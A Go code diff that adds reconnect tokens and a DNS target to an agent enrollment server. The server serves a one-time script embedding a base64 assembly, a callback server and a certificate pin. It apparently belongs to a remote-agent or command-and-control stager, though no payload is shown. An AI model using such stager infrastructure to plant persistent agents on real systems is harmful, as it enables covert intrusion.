@@ -11,25 +11,28 @@ import (
 )
 
 type Session struct {
-	ID          string
-	Server      string
-	Port        int
-	CertPin     string
-	EnrollToken string
-	ExpiresAt   time.Time
-	Delivered   bool
-	Enrolled    bool
+	ID             string
+	Server         string
+	Port           int
+	CertPin        string
+	EnrollToken    string
+	ReconnectToken string
+	DNSTarget      string
+	ExpiresAt      time.Time
+	Delivered      bool
+	Enrolled       bool
 }
 
 type Store struct {
-	mu       sync.Mutex
-	sessions map[string]*Session
-	tokens   map[string]*Session
-	ttl      time.Duration
+	mu         sync.Mutex
+	sessions   map[string]*Session
+	tokens     map[string]*Session
+	reconnects map[string]*Session
+	ttl        time.Duration
 }
 
 func NewStore(ttl time.Duration) *Store {
-	return &Store{sessions: map[string]*Session{}, tokens: map[string]*Session{}, ttl: ttl}
+	return &Store{sessions: map[string]*Session{}, tokens: map[string]*Session{}, reconnects: map[string]*Session{}, ttl: ttl}
 }
 
 func NewSecret(n int) (string, error) {
@@ -40,7 +43,7 @@ func NewSecret(n int) (string, error) {
 	return base64.RawURLEncoding.EncodeToString(b), nil
 }
 
-func (s *Store) Create(server string, port int, certPin string) (*Session, error) {
+func (s *Store) Create(server string, port int, certPin, dnsTarget string) (*Session, error) {
 	id, err := NewSecret(18)
 	if err != nil {
 		return nil, err
@@ -49,11 +52,16 @@ func (s *Store) Create(server string, port int, certPin string) (*Session, error
 	if err != nil {
 		return nil, err
 	}
-	sess := &Session{ID: id, Server: server, Port: port, CertPin: certPin, EnrollToken: tok, ExpiresAt: time.Now().Add(s.ttl)}
+	reconnect, err := NewSecret(32)
+	if err != nil {
+		return nil, err
+	}
+	sess := &Session{ID: id, Server: server, Port: port, CertPin: certPin, EnrollToken: tok, ReconnectToken: reconnect, DNSTarget: dnsTarget, ExpiresAt: time.Now().Add(s.ttl)}
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	s.sessions[id] = sess
 	s.tokens[tok] = sess
+	s.reconnects[reconnect] = sess
 	return sess, nil
 }
 
@@ -67,6 +75,7 @@ func (s *Store) RedeemScript(id string) (*Session, error) {
 	if time.Now().After(sess.ExpiresAt) {
 		delete(s.sessions, id)
 		delete(s.tokens, sess.EnrollToken)
+		delete(s.reconnects, sess.ReconnectToken)
 		return nil, errors.New("enrollment expired")
 	}
 	if sess.Delivered {
@@ -76,19 +85,24 @@ func (s *Store) RedeemScript(id string) (*Session, error) {
 	return sess, nil
 }
 
-func (s *Store) Enroll(token string) error {
+func (s *Store) Authenticate(enrollToken, reconnectToken string) error {
 	s.mu.Lock()
 	defer s.mu.Unlock()
-	sess := s.tokens[token]
+	sess := s.reconnects[reconnectToken]
+	if sess != nil && sess.Enrolled {
+		return nil
+	}
+	sess = s.tokens[enrollToken]
 	if sess == nil {
 		return errors.New("invalid enrollment token")
 	}
 	if time.Now().After(sess.ExpiresAt) {
 		delete(s.sessions, sess.ID)
-		delete(s.tokens, token)
+		delete(s.tokens, enrollToken)
+		delete(s.reconnects, sess.ReconnectToken)
 		return errors.New("enrollment expired")
 	}
-	if sess.Enrolled {
+	if sess.Enrolled && sess.ReconnectToken != reconnectToken {
 		return errors.New("enrollment token already used")
 	}
 	sess.Enrolled = true
@@ -96,11 +110,13 @@ func (s *Store) Enroll(token string) error {
 }
 
 type AgentTemplateData struct {
-	AssemblyB64 string
-	Server      string
-	Port        int
-	CertPin     string
-	EnrollToken string
+	AssemblyB64    string
+	Server         string
+	Port           int
+	CertPin        string
+	EnrollToken    string
+	ReconnectToken string
+	DNSTarget      string
 }
 
 func AgentHandler(store *Store, tmpl *template.Template, assemblyB64 string) http.HandlerFunc {
@@ -113,6 +129,6 @@ func AgentHandler(store *Store, tmpl *template.Template, assemblyB64 string) htt
 		}
 		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
 		w.Header().Set("Cache-Control", "no-store")
-		_ = tmpl.Execute(w, AgentTemplateData{AssemblyB64: assemblyB64, Server: sess.Server, Port: sess.Port, CertPin: sess.CertPin, EnrollToken: sess.EnrollToken})
+		_ = tmpl.Execute(w, AgentTemplateData{AssemblyB64: assemblyB64, Server: sess.Server, Port: sess.Port, CertPin: sess.CertPin, EnrollToken: sess.EnrollToken, ReconnectToken: sess.ReconnectToken, DNSTarget: sess.DNSTarget})
 	}
 }
